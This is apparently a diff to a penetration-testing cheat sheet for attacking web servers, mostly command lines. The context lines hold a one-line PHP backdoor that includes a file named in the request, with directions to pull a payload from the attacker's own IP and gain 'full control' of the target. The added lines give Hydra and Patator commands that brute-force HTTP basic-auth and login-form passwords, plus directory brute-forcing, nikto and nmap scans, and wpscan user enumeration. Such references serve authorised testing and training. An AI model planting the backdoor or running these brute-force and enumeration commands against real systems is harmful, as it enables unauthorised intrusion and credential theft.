@@ -56,9 +56,78 @@ Things to be on look for:
     $ <?php include _GET\['inc'\]; ?> simplest backdoor to keep it dynamic without anything messing your output > $ Then you can just http://IP/inc.php?inc=http:// > $YOURIP/bg.php and have full control with minimal footprint on target machine $ get phpinfo()
 
 HTTPS
-
     $ Heartbleed / CRIME / Other similar attacks
     $ Read the actual SSL CERT to:
     $ find out potential correct vhost to GET
     $ is the clock skewed
     $ any names that could be usernames for bruteforce/guessing
+
+HTTP basic authentication
+# Hydra
+hydra -l <USER> -V -P <PASSWORDS_LIST> -s 80 -f <IP> http-get /<URL_ENDPOINT>/ -t 15
+
+# Patator
+python patator.py http_fuzz auth_type=basic url=<URL> user_pass=FILE0 0=<USER:PASSWORD_LIST> -x ignore:code=401 -x ignore:code=307
+
+HTTP GET request
+hydra <IP> -V -l <USER> -P <PASSWORDS_LIST> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>
+
+HTTP POST request
+hydra -l <USER> -P <PASSWORDS_LIST> <IP> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <THREADS_NUMBER>
+
+Spidering / Brute force directories / files
+gospider -d <DEPTHS> --robots --sitemap -t <THREADS> -s <URL>
+ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <URL>/FUZZ -e .php,.txt -t <THREADS>
+dirbuster
+Dictionaries :
+   - /usr/share/wordlists/dirb/common.txt
+   - /usr/share/wordlists/dirb/big.txt
+   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+HTTP(S)
+Nikto scan
+nikto -host 192.168.0.20
+nikto -ssl -host 192.168.0.20:443
+
+Directories scan
+dirb http://192.168.0.20/ /usr/share/wordlists/dirb/big.txt
+gobuster dir -u http://192.168.0.20/ -w /usr/share/wordlists/dirb/big.txt
+
+HTTP Enumeration
+The following tools are useful to enumerate paths and files inside webservers, they operate in a similar way as a web crawler or web spider.
+nmap --open -sV -p 80,8080,443,8000 -O $IP/24
+
+Virtual domains
+nmap --open --script=hostmap -p 80 $IP
+
+TRACE method:
+nmap --open --script=http-trace -p 80 $IP
+
+Enumerate userdir:
+nmap --open --script=http-userdir-enum $IP
+
+Nikto scanner:
+nikto -host http://$IP
+
+Dirb scanner:
+dirb http://$IP
+
+For WordPress (wpscan):
+docker pull wpscanteam/wpscan
+docker run -it --rm wpscanteam/wpscan --stealthy --url https://$DOMAIN/
+docker run -it --rm wpscanteam/wpscan --url https://$DOMAIN/ --enumerate u
+
+For Joomla:
+joomscan http://$IP
+
+Gobuster (https://github.com/OJ/gobuster):
+gobuster -u https://$DOMAIN -w /usr/share/dirb/wordlists/common.txt
+gobuster -u https://$DOMAIN -c 'session=123456' -t 50 -w /usr/share/dirb/wordlists/common.txt -x .php,.html
+Use -k flag to not verify digital certificates in a https session.
+
+HTTP Brute-Force & Vulnerability Scanning
+target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
+target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
+target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
+
+
